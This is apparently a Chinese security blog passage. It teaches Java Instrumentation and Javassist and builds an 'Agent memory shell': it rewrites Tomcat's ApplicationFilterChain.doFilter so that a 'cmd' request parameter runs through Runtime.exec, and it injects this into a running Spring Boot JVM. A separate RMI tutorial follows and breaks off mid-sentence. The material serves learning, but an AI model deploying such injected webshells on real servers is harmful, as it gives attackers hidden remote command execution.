那个参数数组，还必须有一个它的参数类它本质是一个接口重要方法的大概作用如下\njavapublic interface Instrumentation &#123;\n    \n    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。\n    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);\n \n    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。\n    void addTransformer(ClassFileTransformer transformer);\n \n    //删除一个类转换器\n    boolean removeTransformer(ClassFileTransformer transformer);\n \n \n    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。\n    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;\n \n \n \n    //判断一个类是否被修改\n    boolean isModifiableClass(Class&lt;?&gt; theClass);\n \n    // 获取目标已经加载的类。\n    @SuppressWarnings(&quot;rawtypes&quot;)\n    Class[] getAllLoadedClasses();\n \n    //获取一个对象的大小\n    long getObjectSize(Object objectToSize);\n \n&#125;下面我们来简单实现以下获取和修改目标 JVM 已加载的类，步骤其实和 agentmain 的时候差不多，就是把我们指定的 agent 替换为Agentmain-Instrumentation 的即可\njavaimport java.lang.instrument.Instrumentation;\n\npublic class JAVA_Agentmain_Instrument &#123;\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException &#123;\n        Class [] classes=inst.getAllLoadedClasses();\n\n        for (Class cls:classes)&#123;\n            System.out.println(&quot;-----------------------&quot;);\n            System.out.println(&quot;加载类: &quot;+cls.getName());\n            System.out.println(&quot;是否可以被修改: &quot;+inst.isModifiableClass(cls));\n\n        &#125;\n    &#125;\n\n&#125;然后还是用 Sleep_Hello 去实现，用 Inject 将我们的 Agentmain_Instrument 注入进去效果图如下然后我们再来介绍一下addTransformer\naddTransformer上面对Instrumentation 这个接口做总介绍的时候提到过，它的作用就是增加一个 Class 文件的转化器，该转化器用来改变 class 二进制流的数据，其参数 canRetransform  限制其能否重新转化在 Instrumentation 中由 addTransformer 添加的新 transformer calss 文件转换器不仅可以修改二进制流数据，而且能够对未加载的类进行拦截，同时能够对已加载的类进行重新拦截，我们之后就是根据这个特性来实现动态修改字节码的。而我们创建的这个 transform 转换器需要实现一个接口：ClassFileTransformer ，该接口里面只有一个方法，然后返回一个 byte 数组，其实就是 class 的二进制流数据所以整个Instrumentation 作用的流程简化一下：\n\n首先 Instrumentation. addTransformer()  来加载一个转换器\n转换器的结果 （transform 方法的 return） 将成为转换后的字节码\n针对这些字节码，没有加载的类会使用 ClassLoader.defineClass()去定义它，对于已经加载的类，会使用\nClassLoader.redefineClass()重新定义，并配合 Instrumentation.retransformClasses  进行转化\n\n简而言之，该方法能够让我们动态的修改已经加载和没有加载的类，达到动态修改字节码的作用请注意：当存在多个转换器时，转换将由 transform 调用链组成，也就是说一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）\nJavassist为什么接下来又学 javassist 呢？因为它也将作为我们对字节码操作的一大利器，不学不行\n使用 Javassist 创建类java 的 class 文件都是以字节码的形式存在的，javassist 工具能够帮助我们创建字节码，修改字节码（改类的方法，属性等等），并且能够从字节码中实例化出对象，很牛逼的工具如何使用呢？我们先导入一下依赖\nxml&lt;dependency&gt;\n  &lt;groupId&gt;org.javassist&lt;/groupId&gt;\n  &lt;artifactId&gt;javassist&lt;/artifactId&gt;\n  &lt;version&gt;3.25.0-GA&lt;/version&gt;\n&lt;/dependency&gt;然后我们直接从一个案例中学习一个用 javassist 创建 class 文件的 demo：先看它的原始代码（其实就是把注释去掉联合起来）\njavaimport javassist.*;\n\n/**\n * @author rickiyang\n * @date 2019-08-06\n * @Desc\n */\npublic class javassistDemo &#123;\n\n    /**\n     * 创建一个Person 对象\n     *\n     * @throws Exception\n     */\n    public static void createPseson() throws Exception &#123;\n        ClassPool pool = ClassPool.getDefault();\n        CtClass cc = pool.makeClass(&quot;org.example.javassit.Person&quot;);\n        CtField param = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, cc);\n        param.setModifiers(Modifier.PRIVATE);\n        cc.addField(param, CtField.Initializer.constant(&quot;xiaoming&quot;));\n        cc.addMethod(CtNewMethod.setter(&quot;setName&quot;, param));\n        cc.addMethod(CtNewMethod.getter(&quot;getName&quot;, param));\n        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);\n        cons.setBody(&quot;&#123;name = \\&quot;xiaohong\\&quot;;&#125;&quot;);\n        cc.addConstructor(cons);\n        cons = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;, cc);\n        cons.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);\n        cc.addConstructor(cons);\n        CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, cc);\n        ctMethod.setModifiers(Modifier.PUBLIC);\n        ctMethod.setBody(&quot;&#123;System.out.println(name);&#125;&quot;);\n        cc.addMethod(ctMethod);\n        cc.writeFile(&quot;E:\\\\CTFLearning\\\\Java\\\\agentdemo\\\\&quot;);\n    &#125;\n\n    public static void main(String[] args) &#123;\n        try &#123;\n            createPseson();\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n然后我们逐步分析重新写一个带有注释的案例\njavaimport javassist.*;\n\n/**\n * @author rickiyang\n * @date 2019-08-06\n * @Desc\n */\npublic class javassistDemo &#123;\n\n    /**\n     * 创建一个Person 对象\n     *\n     * @throws Exception\n     */\n    public static void createPseson() throws Exception &#123;\n        //1.先创建一个类池（直译classpool），就是用来创建类的启动器\n        ClassPool pool = ClassPool.getDefault();\n\n        //2.然后用pool来指定创建一个空类Person在指定的目录下\n        CtClass cc = pool.makeClass(&quot;com.stoocea.javassit.Person&quot;);\n\n        //3.1 新增一个字段叫做name\n        //3.2 并且通过setModifiers将该类的访问级别设置为private\n        //3.3 然后调用addField方法，模拟一个静态代码块对name赋值为&quot;xiaoming&quot;\n        CtField param = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, cc);\n        param.setModifiers(Modifier.PRIVATE);\n        cc.addField(param, CtField.Initializer.constant(&quot;xiaoming&quot;));\n\n        //4. 添加name的set和get方法\n        cc.addMethod(CtNewMethod.setter(&quot;setName&quot;, param));\n        cc.addMethod(CtNewMethod.getter(&quot;getName&quot;, param));\n\n        //5.1 通过CtConstructor来创建构造方法，这里是无参构造的部分\n        //5.2 将无参构造的内容设置为name=xiaohong;\n        //5.3 然后通过addConstructor方法将刚才写的构造方法添加进类\n        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);\n        cons.setBody(&quot;&#123;name = \\&quot;xiaohong\\&quot;;&#125;&quot;);\n        cc.addConstructor(cons);\n\n        //5.4 下面其实就是有参构造部分，依然是先构造一个CtConstructor，只不过这次有参数\n        //5.5 然后依然是设置方法内容，这里的$0=this $1,$2,$3,$4.....代表方法参数，也就是说我们将当前this.name=有参构造的第一个参数\n        //5.6 然后继续add构造方法\n        cons = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;, cc);\n        cons.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);\n        cc.addConstructor(cons);\n\n        //接下来就是更为普适的方法写入了，这里的实例化作用是创建了一个名为printName的方法，无参数无返回值，输出name值\n        CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, cc);\n        ctMethod.setModifiers(Modifier.PUBLIC);\n        ctMethod.setBody(&quot;&#123;System.out.println(name);&#125;&quot;);\n        cc.addMethod(ctMethod);\n\n        //然后指定写入的目录，这里要和我们刚才开始的创建CtClass对象结合着看，这里就是写入的项目路径，创建的CtClass对象中的路径就是在项目路径下的具体路径\n        cc.writeFile(&quot;H:\\\\javasecurity\\\\Javassistlearn&quot;);\n    &#125;\n\n    public static void main(String[] args) &#123;\n        try &#123;\n            createPseson();\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;分析完毕后呢，具体的结果应该如下\n步骤总结首先实例化一个 CtClass 对象，我们之后的创建 CtFiled 或者 CtMethod，CtConstructor 都是对其的补充，而 CtClass 就代表着我们要创建的那个类这里需要注意一点，ClassPool 会在内存中维护所有被它创建过的 CtClass，所以当 CtClass 过多的时候，会占用大量的内存，API 中给出的解决方法是，有意识地调用 detach()以释放内存\nClassPool需要关注的方法：\n\ngetDefault : 返回默认的ClassPool 是单例模式的，一般通过该方法创建我们的ClassPool；\nappendClassPath, insertClassPath : 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；\ntoClass : 将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；\nget , getCtClass : 根据类路径名获取该类的CtClass对象，用于后续的编辑。\n\nCtClass需要关注的方法：\n\nfreeze : 冻结一个类，使其不可修改；\nisFrozen : 判断一个类是否已被冻结；\nprune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；\ndefrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；\ndetach : 将该class从ClassPool中删除；\nwriteFile : 根据CtClass生成 .class 文件；\ntoClass : 通过类加载器加载该CtClass。\n\n上面我们创建一个新的方法使用了CtMethod类。CtMthod代表类中的某个方法，可以通过CtClass提供的API获取或者CtNewMethod新建，通过CtMethod对象可以实现对方法的修改。CtMethod中的一些重要方法：\n\ninsertBefore : 在方法的起始位置插入代码；\ninsterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；\ninsertAt : 在指定的位置插入代码；\nsetBody : 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；\nmake : 创建一个新的方法。\n\n然后我们上面在写指定类的构造方法的时候用到了一些符号，$0 $1 $2 $3,代表是哪个参数，按照索引排序来的，$0 是代表 this\n调用生成的 class 文件这里我们对上面用 javassist 生成的 class 文件进行一个方法的调用只需在原有的创建对象的代码基础上加上后面的一些特殊调用方法即可，然后我们不写入到具体的文件了，就直接调用\njava\n........\n        cc.addMethod(ctMethod);\n    //通过调用CtClass的toClass方法获取到指定类，然后进行实例化，之后就是通过反射调用的步骤\n        Object person=cc.toClass().newInstance();\n        Method setName=person.getClass().getDeclaredMethod(&quot;setName&quot;,String.class);\n        setName.invoke(person,&quot;stoocea&quot;);\n        Method printName=person.getClass().getDeclaredMethod(&quot;printName&quot;);\n        printName.invoke(person);\n\n\n    public static void main(String[] args) &#123;\n        try &#123;\n            createPseson();\n        &#125; catch (Exception e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;效果图下当然还有通过.class 文件调用到我们用 javassist 写的类的方法（这两种方法就搬一下 boogipop 师傅的代码了）\njava   ClassPool pool = ClassPool.getDefault();\n// 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬\n        pool.appendClassPath(&quot;E:\\\\CTFLearning\\\\Java\\\\agentdemo\\\\&quot;);\n    //获取Person的class对象\n        CtClass ctClass = pool.get(&quot;com.boogipop.javassit.Person&quot;);\n        Object person = ctClass.toClass().newInstance();\n下面就还是反射调用的步骤了或者是通过 person 类来创建一个接口，然后实例化之后接着调用即可\njava   ClassPool pool = ClassPool.getDefault();\n// 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬\n        pool.appendClassPath(&quot;E:\\\\CTFLearning\\\\Java\\\\agentdemo\\\\&quot;);\n    //获取Person的class对象\n        CtClass ctClass = pool.get(&quot;com.boogipop.javassit.Person&quot;);\n        CtClass ctClassI = pool.get(&quot;com.boogipop.javassit.PersonI&quot;);\n        // 使代码生成的类，实现 PersonI 接口\n        ctClass.setInterfaces(new CtClass[]&#123;ctClassI&#125;);\n        PersonI person = (PersonI) ctClass.toClass().newInstance();\n        person.setName(&quot;阿良良木历&quot;);\n        person.printName();两者的前提都是先通过 javassist 开始创建一个 person 对象\n修改已加载类的字节码上面铺垫了 Instrumentation 和 javassist 这么久，其实就是为了这里服务的，我们通过 Instrumentation 的 transformer 转换器获取到指定 JVM，然后指定重写这个 JVM 中类内容，重写的实现呢，自然是通过 javassist 了再具体一点，主要是通过 addTransformer 来创建一个转换器开启动态修改字节码这个过程，然后通过 retransformClasses 来最终执行我们修改的操作（这个时候已经用 javassist 修改完目标 JVM 中的字节码了）先准备一个目标 JVM，拿之前 agentmain 的 sleep_hello 就行\njavaimport static java.lang.Thread.sleep;\n\npublic class Sleep_Hello &#123;\n    public static void main(String[] args) throws InterruptedException &#123;\n        while (true)&#123;\n            System.out.println(&quot;Hello World!&quot;);\n            sleep(5000);\n        &#125;\n    &#125;\n&#125;再准备 AgentMain，然后打一个 jar 包\njavaimport java.lang.instrument.Instrumentation;\nimport java.lang.instrument.UnmodifiableClassException;\npublic class JAVA_Agentmain &#123;\n    public static void agentmain(String args, Instrumentation inst) throws Exception &#123;\n        Class [] classes=inst.getAllLoadedClasses();\n\n        for (Class cls:classes)&#123;\n           if(cls.getName().equals(&quot;org.example.Sleep_Hello&quot;))&#123;\n               inst.addTransformer(new Hello_Transform(),true);\n               inst.retransformClasses(cls);\n\n           &#125;\n        &#125;\n    &#125;\n\n&#125;\n还要写上具体的 transform 方法的内容，当然我们修改字节码的关键就在这了（javassist 也是在这里进行的操作）\njavaimport java.lang.instrument.ClassFileTransformer;\nimport java.lang.instrument.IllegalClassFormatException;\nimport java.security.ProtectionDomain;\nimport javassist.*;\npublic class Hello_Transform implements ClassFileTransformer &#123;\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;\n        try&#123;\n            //获取CtClass对象的容器 ClassPool\n            ClassPool classPool=ClassPool.getDefault();\n\n            //添加额外的类搜索路径\n            if(classBeingRedefined!=null)&#123;\n                ClassClassPath ccp=new ClassClassPath(classBeingRedefined);\n                classPool.insertClassPath(ccp);\n            &#125;\n\n            //通过Ct获取到我们待会要修改字节码的累\n            CtClass ctClass=classPool.get(&quot;org.example.Sleep_Hello&quot;);\n            System.out.println(ctClass);\n\n            //获取目标方法\n            CtMethod ctMethod= ctClass.getDeclaredMethod(&quot;hello&quot;);\n\n            //设置方法体，也就是具体修改的修改字节码的部分\n            String body =&quot;&#123;System.out.println(\\&quot;stoocea Hacker\\&quot;);&#125;&quot;;\n            ctMethod.setBody(body);\n\n            //返回目标类字节码\n            byte[] bytes =ctClass.toBytecode();\n            return bytes;\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n        return null;\n    &#125;\n&#125;然后就是注入 Inject 的内容了，通过他来将我们的 agentmain 注入进去\njava\nimport java.util.List;\nimport com.sun.tools.attach.*;\n\npublic class Inject_Agent &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();\n        for (VirtualMachineDescriptor vmd : list)&#123;\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if (vmd.displayName().equals(&quot;org.example.Sleep_Hello&quot;))&#123;\n                System.out.println(&quot;正在注入&quot;);\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n\n                //加载Agent\n                virtualMachine.loadAgent(&quot;H:\\\\javasecurity\\\\AgentInstrumentation\\\\target\\\\AgentInstrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);\n\n                //断开JVM连接\n                virtualMachine.detach();\n            &#125;\n        &#125;\n    &#125;\n&#125;\n之后就是运行 Sleep_Hello 使他的 JVM 持续运作，然后运行 Inject，将我们的 agentmain 注入到它的 JVM 中，然后我们的 agentmain 中的内容又是通过addTransformer 来开启了一个动态加载字节码的过程，transform 又被我们重写成了用 javassist 修改 Sleep_Hello 字节码的内容所以一旦我们注入进 agentmain，就会重写一直在运行的 Sleep_Hello 的字节码，表现为：本来一直在 hello world，然后突然现实一句 javassist，之后的内容变成了 “stoocea Hacker”了\nAgent 内存马实现本文章其实主要写到现在,也是终于可以开始写 Agent 内存马了但是这里主要的实现是通过 Springboot 来的，我个人 Springboot 还不是很熟，所以只能依葫芦画瓢，这篇 Agent 内存马之后就去补 Spring 基础了根据 tomcat 的责任链机制，我们可以知道，每一次请求的调用栈中都会有一个反复调用InternalDoFilter的链**internalDoFilter-&gt;doFilter-&gt;service** ，也就是说 Spring 他在处理请求时会不断调用 internalFilter 方法，或者是 Dofliter 方法，是不是和我们上面的 Sleep_Hello 不断调用 helloworld 方法一样？我们既能够知道他 JVM 的具体名称，也能够通过 Javassist 去修改这两个方法的字节码内容，实现不断调用我们的改写的恶意方法的效果而且这两个方法具有参数**request response**** **拿来回显也是很好的选择\n\n\n注入过程首先先写一下最终通过 javassit 修改字节码的内容\njavaimport java.lang.instrument.ClassFileTransformer;\nimport java.lang.instrument.IllegalClassFormatException;\nimport java.security.ProtectionDomain;\nimport javassist.*;\npublic class Hello_Transform implements ClassFileTransformer &#123;\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;\n        try&#123;\n            //获取CtClass对象的容器 ClassPool\n            ClassPool classPool=ClassPool.getDefault();\n\n            //添加额外的类搜索路径\n            if(classBeingRedefined!=null)&#123;\n                ClassClassPath ccp=new ClassClassPath(classBeingRedefined);\n                classPool.insertClassPath(ccp);\n            &#125;\n\n            //通过Ct获取到我们待会要修改字节码的类\n            CtClass ctClass=classPool.get(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);\n            System.out.println(ctClass);\n\n            //获取目标方法\n            CtMethod ctMethod= ctClass.getDeclaredMethod(&quot;doFilter&quot;);\n\n            //设置方法体，也就是具体修改的修改字节码的部分\n            String body = &quot;&#123;&quot; +\n                    &quot;javax.servlet.http.HttpServletRequest request = $1\\n;&quot; +\n                    &quot;String cmd=request.getParameter(\\&quot;cmd\\&quot;);\\n&quot; +\n                    &quot;if (cmd !=null)&#123;\\n&quot; +\n                    &quot;  Runtime.getRuntime().exec(cmd);\\n&quot; +\n                    &quot;  &#125;&quot;+\n                    &quot;&#125;&quot;;\n            ctMethod.setBody(body);\n\n            //返回目标类字节码\n            byte[] bytes =ctClass.toBytecode();\n            return bytes;\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n        return null;\n    &#125;\n&#125;然后写一下 Agentmain 以及 MF 文件，之后打包成 jar 包\njavaimport org.example.Hello_Transform;\n\nimport java.lang.instrument.Instrumentation;\nimport java.lang.instrument.UnmodifiableClassException;\npublic class JAVA_Agentmain &#123;\n    public static void agentmain(String args, Instrumentation inst) throws Exception &#123;\n        Class [] classes=inst.getAllLoadedClasses();\n\n        for (Class cls:classes)&#123;\n            if(cls.getName().equals(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;))&#123;\n                inst.addTransformer(new Hello_Transform(),true);\n                inst.retransformClasses(cls);\n\n            &#125;\n\n        &#125;\n    &#125;\n\n&#125;javaManifest-Version: 1.0\nAgent-Class: org.SpringMeshell.JAVA_Agentmain\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\n最终就是 inject 最终注入类了\njavaimport com.sun.tools.attach.VirtualMachine;\nimport com.sun.tools.attach.VirtualMachineDescriptor;\n\nimport java.util.List;\n\npublic class Inject_Agent &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();\n        for (VirtualMachineDescriptor vmd : list)&#123;\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if (vmd.displayName().equals(&quot;JavaAgentSpringBootApplication&quot;))&#123;\n                System.out.println(&quot;正在注入&quot;);\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n\n                //加载Agent\n                virtualMachine.loadAgent(&quot;H:\\\\javasecurity\\\\AgentMeshell\\\\target\\\\AgentInstrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);\n\n                //断开JVM连接\n                virtualMachine.detach();\n            &#125;\n        &#125;\n    &#125;\n&#125;之后的实现就不做了，因为 Spring 这块的知识还在补习\n回顾一下其实学 agent 内存马我的目的不是其本身，而是它的前置知识很诱人，就是 JAVAagent 和 javassist，所以这块的重点也自然放在这两个上，然后现阶段的主要工作是在做前面知识的复习，以及后续知识的推进，JAVAagent 这块的知识对于我来说是新的知识，所以接下来是对前面旧知识的复习，包括 Spring 基础，RMI，JNDI 等\n","slug":"JavaAgent内存马","date":"2024-03-06T09:50:51.000Z","categories_index":"锻刀的理论学习-javaAgent","tags_index":"锻刀","author_index":"stoocea"},{"id":"0ce28fa6147ef2b2eac72ef8d04cf1ac","title":"RMIRe0","content":"https://su18.org/post/rmi-attack/#%E9%9B%B6-%E5%89%8D%E8%A8%80\n学完之后感觉 SU18 师傅这一段内容很精华，也算是对 RMI 的整个流程都概括进来了，想到要复习了可以先看看下面这段：\n\nRMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。\nStub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。\nRemoteCall 序列化 RMI 服务名称、Remote 对象。\nRMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。\nRMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。\nSkeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。\nSkeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。\nRMI 客户端反序列化服务端结果，获取远程对象的引用。\nRMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。\nRMI 客户端反序列化 RMI 远程方法调用结果。\n\n1.RMI 介绍RMI (Remote Method Invocation) 英文翻译过来就是“远程方法调用”是一种调用远程位置的对象来执行方法的思想，这听起来就很危险，而远程调用的思想其实在 C 语言中就有体现，RPC（Remote Procedure Calls），用来打包和传输数据结构。而在 java 中，远程传输通常都是传输一个对象，这个对象包括属性值和方法，传输的媒介往往都是 java 的序列化数据，结合动态类加载和安全管理器实现一个 java 类的传输具体的实现思想就是让我们获取到远程主机上对象的引用，我们调用这个引用对象，但实际的执行在远程的位置上\n为了简化网络通信，RMI 引入了两个概念 Stubs（客户端存根），Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就叫 Stub。而在我们最终调用远端（Server）的目标类之前，我们还会经过一个远端代理类，这个类就是 Skeleton，它会接受我们刚才想通过调用 Stub 去调用远端目标类的具体信息，并传递给真实的目标类Stubs 和 Skeletons 的调用对于使用 RMI 服务的使用者来说是隐藏的，我们不需要去主动去调用相关的方法，但实际的客户端和服务端的网络通信都是通过 Stub 和 Skeleton 来实现的这里可以看一下 SU18 师傅的整体调用时序图\n服务端的远程对象大致介绍使用 RMI 首先我们必须要定义一个我们期望能够调用的接口，这个接口必须继承java.rmi.Remote接口，用来远程调用的对象将作为这个接口的实例，之后的 Stub 代理类也将实现这个接口，这个接口中的所有方法都必须声明抛出 java.rmi.RemoteException异常定义完这个接口，我们还要来实现这个远程接口的实现类，这个类中的内容才是我们想要实现的逻辑代码，并且通常会扩展 java.rmi.server.UnicastRemoteObject类，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时提供一些基础的 equals&#x2F;hashcode&#x2F;toString 方法等，这里必须为这个类提供一个构造函数，并且抛出 RemoteException。现在我们来实现一个服务端的可以被远程调用的对象首先定义它的接口\njavaimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\npublic interface RemoteInterface extends Remote &#123;\n    public String sayHello() throws RemoteException;\n    public String sayHello(Object name) throws RemoteException;\n\n&#125;然后来写可以被调用的远程对象，这里我们选择将其继承java.rmi.server.UnicastRemoteObject\njavaimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class RemoteObject extends UnicastRemoteObject implements RemoteInterface  &#123;\n protected  RemoteObject() throws RemoteException&#123;\n\n &#125;\n    @Override\n    public String sayHello() throws RemoteException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public String sayHello(Object name) throws RemoteException &#123;\n        return null;\n    &#125;\n&#125;注册中心的大致介绍远程对象已经创建好，接下还需要实现注册中心（Registry），将我们的远程对象绑定上去。这个注册中心的本质可以想象成一个注册表，客户端通过查找这个注册表的键值对信息，调用到它想调用的对象和方法。具体实现通过 java.rmi.registry.Registry和java.rmi.Naming来实现，我们分开来讲 \njava.rmi.Naming 他是一个 final 类，提供了在 Registry 中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式一般是 //host:port/name\n\nhost：表示注册机所在的主机\nport：表示注册表接受调用的端口号，默认是 1099\nname： 表示一个注册表中 Remote Object 的引用的名称，不能是注册表中的一些关键字\n\nNaming 提供了查询（lookup），绑定（bind），重新绑定（rebind），解除绑定（unbind），列表（list），用来对注册表进行操作，也就是说，Naming 是一个用来对注册表进行操作的类，而这些方法的具体实现是通过LocateRegistry.getRegistry方法获取了 java.rmi.registry.Registry 接口的实现类，并调用其相关方法进行实现的那接下来就是java.rmi.registry.Registry接口，他有两个实现类，分别是RegistryImpl以及 RegistryImpl_Stub，这两个实现类我们下面会讲到通常情况下我们会调用LocateRegistry#createRegistry()方法来进行注册中心的创建下面我们将创建注册中心和绑定远程对象进注册中心的逻辑代码写在同一个 java 程序中，如果不这么做，按照顺序（创建注册中心-&gt;绑定远程对象-&gt;客户端调用远程对象）去一个一个执行 java 程序，在绑定远程对象时就会报错之后我们还需要将远程对象绑定到注册中心上，而LocateRegistry#createRegistry()本身 java 程序运行时不会保持创建状态，之后的Naming#bind()自然也找不到注册中心，所以必须写在同一 java 程序中\njavaimport java.rmi.Naming;\n\npublic class RemoteServer &#123;\n    public static void main(String[] args) throws Exception &#123;\n        LocateRegistry.createRegistry(1099);\n         System.out.println(&quot;server start&quot;);\n        RemoteInterface remoteObject =new RemoteObject();\n        Naming.bind(&quot;rmi://localhost:1099/Hello&quot;,remoteObject);\n        \n    &#125;\n\n&#125;客户端调用实现测试类\njavaimport java.rmi.NotBoundException;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.util.Arrays;\n\n\npublic class RMIClient &#123;\n    public static void main(String[] args) throws RemoteException, NotBoundException &#123;\n        //通过getRegistry获取到注册中心\n        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);\n        System.out.println(Arrays.toString(registry.list()));\n\n        //然后通过Client端的Stub代理类发送一个远程对象以及方法的请求调用\n        //这里我们通过注册中心拿到对应的远程对象，然后调用其方法\n        RemoteInterface stub=(RemoteInterface) registry.lookup(&quot;Hello&quot;);\n        System.out.println(stub.sayHello());\n    &#125;\n&#125;先运行 服务端的注册中心以及远程对象的绑定，之后再启动客户端程序，打印如下结果有两个值得注意的点：RemoteInterface接口在 Client&#x2F;Server&#x2F;Registry 中均应该存在当客户端在调用远程对象时，传递了一个可序列化的对象，如果这个对象在服务端不存在，则会在服务端直接抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了java.rmi.server.codebase，则会尝试从其他地址中获取.class 文件加载，并反序列化上面这个特性跟安全策略这个设置有关，RMI 通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类\n铺垫了这么多前置知识，接下来进入源码流程分析\n2.源码分析1.服务注册0x01 远程对象创建我们在创建远程对象的时候提到，必须要实现远程 Remote 接口，一般情况下也是要继承 UnicastRemoteObject 这个类的我们在创建远程对象的时候提到，必须要实现远程 Remote 接口，一般情况下也是要继承 UnicastRemoteObject 